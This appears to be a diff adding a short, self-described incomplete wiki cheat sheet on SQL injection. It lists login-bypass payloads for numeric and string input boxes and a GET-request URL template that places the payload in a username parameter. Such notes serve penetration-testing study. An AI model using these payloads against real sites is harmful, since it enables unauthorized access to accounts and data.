@@ -1,0 +1,22 @@
+====== SQL Injection ======
+
+<WRAP center round important 60%>
+This section is incomplete and needs further work!
+</WRAP>
+
+===== Input Box =====
+
+  *Non-string:<code sql>
+1 OR '1'='1';-- -
+</code> 
+  *String:<code sql>
+' OR '1'='1';-- -
+</code>
+
+===== URL =====
+
+  *GET request:<code>
+http[s]://<SERVER>[:PORT][/PATH]?<USERNAME=>' OR '1'='1';-- -<&PASSWORD=>1
+</code>
+
+https://www.sqlinjection.net
